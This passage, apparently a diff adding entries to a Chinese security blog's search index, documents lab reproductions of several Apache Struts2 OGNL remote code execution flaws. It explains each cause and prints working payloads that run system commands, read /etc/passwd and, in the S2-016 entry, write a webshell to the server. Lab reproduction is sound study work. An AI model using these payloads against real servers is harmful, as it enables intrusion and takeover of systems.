+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;56.0.2924.87 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.8,es;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: %&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,7*7)&#125;.multipart&#x2F;form-data</span><br></pre></td></tr></table></figure>
+
+<p><code>7*7</code>已成功执行：</p>
+<p><img src="https://image.3001.net/images/20220218/16451649297514.png" alt="image-20220210175218946"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-032 远程代码执行漏洞（CVE-2016-3081）</title>
+    <url>/2022/02/18/S2-032/</url>
+    <content><![CDATA[<h1 id="S2-032-远程代码执行漏洞（CVE-2016-3081）"><a href="#S2-032-远程代码执行漏洞（CVE-2016-3081）" class="headerlink" title="S2-032 远程代码执行漏洞（CVE-2016-3081）"></a>S2-032 远程代码执行漏洞（CVE-2016-3081）</h1><p>受影响的版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3 和 2.3.24.3 除外）</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-032" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-032</a></li>
+<li><a href="https://www.cnblogs.com/mrchang/p/6501428.html" target="_blank" rel="noopener">https://www.cnblogs.com/mrchang/p/6501428.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>容器运行后，访问<code>http://192.168.44.132:8080</code>可以看到一个示例页面。</p>
+<p>Struts 2 中嵌入了一个功能，可以让”!” (bang) 字符调用执行以外的方法。它被称为“动态方法调用”又名 DMI。</p>
+<p>使用 DMI 的一种简单方法是提供以 . 为前缀的 HTTP 参数<code>method:</code>。例如在 URL 中它可能是<code>/category.action?method:create=foo</code>，参数值被忽略。</p>
+<p>DMI 的方法名会被OGNL 表达式引擎求值，这会导致RCE 漏洞。</p>
+<p>访问以下 URL 以触发<code>id</code>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451648872662.png" alt="image-20220210170233485"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-016 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-016/</url>
+    <content><![CDATA[<h1 id="S2-016-远程代码执行漏洞"><a href="#S2-016-远程代码执行漏洞" class="headerlink" title="S2-016 远程代码执行漏洞"></a>S2-016 远程代码执行漏洞</h1><p>受影响的版本：2.0.0 - 2.3.15</p>
+<p>细节：</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-016.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-016.html</a></li>
+<li><a href="http://www.freebuf.com/articles/web/25337.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/25337.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132:8080/index.action?redirect:OGNL expression</code>以执行 OGNL 表达式。</p>
+<p>执行<code>uname -a</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;false,#f&#x3D;#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a&#x3D;@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b&#x3D;new java.io.InputStreamReader(#a),#c&#x3D;new java.io.BufferedReader(#b),#d&#x3D;new char[5000],#c.read(#d),#genxor&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取网页目录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect:$&#123;#req&#x3D;#context.get(&#39;co&#39;+&#39;m.open&#39;+&#39;symphony.xwo&#39;+&#39;rk2.disp&#39;+&#39;atcher.HttpSer&#39;+&#39;vletReq&#39;+&#39;uest&#39;),#resp&#x3D;#context.get(&#39;co&#39;+&#39;m.open&#39;+&#39;symphony.xwo&#39;+&#39;rk2.disp&#39;+&#39;atcher.HttpSer&#39;+&#39;vletRes&#39;+&#39;ponse&#39;),#resp.setCharacterEncoding(&#39;UTF-8&#39;),#ot&#x3D;#resp.getWriter (),#ot.print(&#39;web&#39;),#ot.print(&#39;path:&#39;),#ot.print(#req.getSession().getServletContext().getRealPath(&#39;&#x2F;&#39;)),#ot.flush(),#ot.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取webshell：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;false,#f&#x3D;#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;),#b&#x3D;new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath(&quot;&#x2F;&quot;)).append(@java.io.File@separator).append(&quot;1.jspx&quot;).toString()),#b.write(#a.getParameter(&quot;t&quot;).getBytes()),#b.close(),#genxor&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(&quot;BINGO&quot;),#genxor.flush(),#genxor.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="https://image.3001.net/images/20220218/16451648358399.png" alt="image-20220210145859259"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-013/S2-014 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-013%E3%80%81S2-014/</url>
+    <content><![CDATA[<h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><p>受影响的版本：2.0.0 - 2.3.14.1</p>
+<p>细节：</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-013.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-013.html</a></li>
+<li><a href="http://struts.apache.org/docs/s2-014.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-014.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Struts2 的标签<code>&lt;s:a&gt;</code>和<code>&lt;s:url&gt;</code>提供了一个 includeParams 属性。该属性的主要作用域是了解是否包含 http 请求参数。</p>
+<p>includeParams 的允许值为：</p>
+<ol>
+<li>none - 在 URL 中不包含任何参数（默认）</li>
+<li>get - 在 URL 中仅包含 GET 参数</li>
+<li>all - 在 URL 中包含 GET 和 POST 参数</li>
+</ol>
+<p>当 时<code>includeParams=all</code>，这个请求的 GET 和 POST 参数放在 URL 的 GET 参数上。在此过程中，参数将被 OGNL 表达式解析。它导致命令执行。</p>
+<p>远程代码执行POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b&#x3D;new java.io.InputStreamReader(#a),#c&#x3D;new java.io.BufferedReader(#b),#d&#x3D;new char[50000],#c.read(#d),#out&#x3D;@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>paylaod例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;link.action?a&#x3D;%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451647805253.png" alt="image-20220210105446433"></p>
+<p>S2-014 是对 S2-013 的更正。因为当 S2-013 被修复时，OGNL 表达式的执行方法如 ${ognl_exp} 被忽略了，而 S2-014 是它的增强补丁。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;S2-013&#x2F;link.action?xxxx&#x3D;%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-012 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-012/</url>
+    <content><![CDATA[<h1 id="S2-012-远程代码执行漏洞"><a href="#S2-012-远程代码执行漏洞" class="headerlink" title="S2-012 远程代码执行漏洞"></a>S2-012 远程代码执行漏洞</h1><p>受影响的版本：2.1.0 - 2.3.13</p>
+<p>详情：<a href="http://struts.apache.org/docs/s2-012.html" target="_blank" rel="noopener">http ://struts.apache.org/docs/s2-012.html</a></p>
+<a id="more"></a>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>如果在配置时使用了redirect类型<code>result</code>，<code>action</code>并且${param_name}也作为redirect变量，例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-012"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.UserAction"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"redirect"</span> <span class="attr">type</span>=<span class="string">"redirect"</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在重定向过程中，struts2对<code>name</code>参数的值进行OGNL表达式解析，从而可以插入OGNL表达式引起命令执行。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们可以直接使用s2-001的POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="https://image.3001.net/images/20220218/16451647445782.png" alt="image-20220210102726719"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-009 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-009/</url>
+    <content><![CDATA[<h1 id="S2-009-远程代码执行漏洞"><a href="#S2-009-远程代码执行漏洞" class="headerlink" title="S2-009 远程代码执行漏洞"></a>S2-009 远程代码执行漏洞</h1><p>受影响的版本：2.1.0 - 2.3.1.1</p>
+<p>详情：<a href="http://struts.apache.org/docs/s2-009.html" target="_blank" rel="noopener">http ://struts.apache.org/docs/s2-009.html</a></p>
+<a id="more"></a>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p>该漏洞来源于s2-003、s2-005。如果想了解漏洞的原理，需要阅读s2-005的说明：<a href="https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md" target="_blank" rel="noopener">https ://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md</a></p>
+</blockquote>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=21197" target="_blank" rel="noopener">Struts2漏洞分析</a>，文章中提到，引入OGNL的方法可能不仅出现在这个漏洞中，还可能出现在其他Java应用程序中。</p>
+<p>Struts2对s2-003的修复方法是禁止静态方法调用。在 s2-005 中，这个限制可以直接通过 OGNL 绕过。对于<code>#</code>号码，使用代码<code>\u0023</code>或<code>\43</code>绕过；那么s2-005的修复是禁止\等特殊符号阻止用户提交反斜杠的。</p>
+<p>但是，如果<code>example</code>当前操作中接受了一个参数，则该参数将被发送到 OGNL 表达式。所以，我们可以把OGNL表达式代码放在<code>example</code>参数中，然后通过执行<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>，绕过特殊字符的防御，如<code>#</code>，<code>\</code>。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境是一个名为.struts2的“功能展示”网站<code>Struts Showcase</code>。我们需要找到一个接受参数的动作，类型是字符串。</p>
+<p>先解压<code>S2-009.war</code>。我们可以看到源码在<code>WEB-INF/src</code>目录下，我一般找ajax相关的代码。</p>
+<p>找到一个<code>WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java</code>：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example5Action</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2111967621952300611L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码很简单，接受name参数，调用setName赋值给私有属性<code>this.name</code>，符合我们的需求。然后我们去<code>WEB-INF/src/java/struts-ajax.xml</code>查看URL路由设置：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"ajax"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"example5"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.showcase.ajax.Example5Action"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/ajax/tabbedpanel/example5.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/ajax/tabbedpanel/example5Ok.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到<code>name=example5</code>，所以通过访问来访问控制器<code>http://192.168.44.132:8080/ajax/example5.action</code>。然后将 OGNL 漏洞利用代码放入 name 参数并访问 URL：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;ajax&#x2F;example5?age&#x3D;12313&amp;name&#x3D;%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20&#x2F;tmp&#x2F;success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]&#x3D;true HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451646948882.png" alt="image-20220209175900757"></p>
+<p>POC没有显示，所以我们使用<code>touch /tmp/success</code>命令，发现<code>success</code>文件已经创建，证明expliot成功。</p>
+<p><img src="https://image.3001.net/images/20220218/16451646995574.png" alt="image-20220209175910842"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-008 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-008/</url>
+    <content><![CDATA[<h1 id="S2-008-远程代码执行漏洞"><a href="#S2-008-远程代码执行漏洞" class="headerlink" title="S2-008 远程代码执行漏洞"></a>S2-008 远程代码执行漏洞</h1><p>受影响的版本：2.1.0 - 2.3.1</p>
+<p>详情：<a href="http://struts.apache.org/docs/s2-008.html" target="_blank" rel="noopener">http ://struts.apache.org/docs/s2-008.html</a></p>
+<a id="more"></a>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></p>
+<blockquote>
+<p>S2-008 涉及多个漏洞。cookie拦截器配置问题会导致OGNL表达式执行，但大多数web容器（如Tomcat）对cookie名称有字符限制，部分关键字符不能使用。还有一点就是如果struts2开启<code>devMode</code>模式，有多个调试界面可以直接查看对象信息或者执行命令。正如 Kxlzx（作者）提到的，这种情况在真实环境中几乎是不可能的。所以它变成了它非常没用，但我不认为它是绝对的。可以破解一个在服务器上打开<code>debug</code>模式的 struts2 应用程序作为后门。</p>
+</blockquote>
+<p>例如<code>?debug=command&amp;expression=&lt;OGNL EXP&gt;</code>在<code>devMode</code>mode中添加参数，OGNL表达式会直接执行，可以执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;S2-008&#x2F;devmode.action?debug&#x3D;command&amp;expression&#x3D;(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)</span><br></pre></td></tr></table></figure>
+
+<p>其他payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;S2-008&#x2F;devmode.action?debug&#x3D;command&amp;expression&#x3D;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;false,#f&#x3D;#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a&#x3D;@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),#b&#x3D;new java.io.InputStreamReader(#a),#c&#x3D;new java.io.BufferedReader(#b),#d&#x3D;new char[50000],#c.read(#d),#genxor&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220218/16451646667917.png" alt="image-20220209175109978"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-007 远程代码执行漏洞</title>
+    <url>/2022/02/18/S2-007/</url>
+    <content><![CDATA[<h1 id="S2-007-远程代码执行漏洞"><a href="#S2-007-远程代码执行漏洞" class="headerlink" title="S2-007 远程代码执行漏洞"></a>S2-007 远程代码执行漏洞</h1><p>受影响的版本：2.0.0 - 2.2.3</p>
+<p>详情：<a href="http://struts.apache.org/docs/s2-007.html" target="_blank" rel="noopener">http ://struts.apache.org/docs/s2-007.html</a></p>
+<a id="more"></a>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></p>
+<p><code>&lt;ActionName&gt; -validation.xml</code>配置验证规则时。如果类型验证转换失败，服务器会拼接用户提交的表单值字符串，然后进行OGNL表达式解析并返回。</p>
+<p>例如这里是一个<code>UserAction</code>：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
+
+<p>和<code>UserAction-validation.xml</code>配置：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">validators</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">"-//OpenSymphony Group//XWork Validator 1.0//EN"</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"int"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"min"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"max"</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户<code>age</code>以 a<code>str</code>而不是a 提交时<code>int</code>，服务器会与代码拼接<code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code>，然后使用 OGNL 表达式对其进行解析。要想成功expliot，我们需要找到一个配置了类似验证规则的表单域来进行转换错误。然后就可以像注入 SQL 单引号一样注入任何 OGNL 表达式代码。</p>
+<p>绕过安全配置的有效负载：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@java.lang.Runtime@getRuntime().exec(&quot;open &#x2F;Applications&#x2F;Calculator.app&quot;)) + &#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这是可以执行任意代码的EXP：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream())) + &#39;</span><br></pre></td></tr></table></figure>
+
+<p>需要URL编码后，将EXP放入输入框（age），然后得到命令执行结果：</p>
+<p><img src="https://image.3001.net/images/20220218/16451646329345.png" alt="image-20220209173228467"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Struts2</tag>
+      </tags>
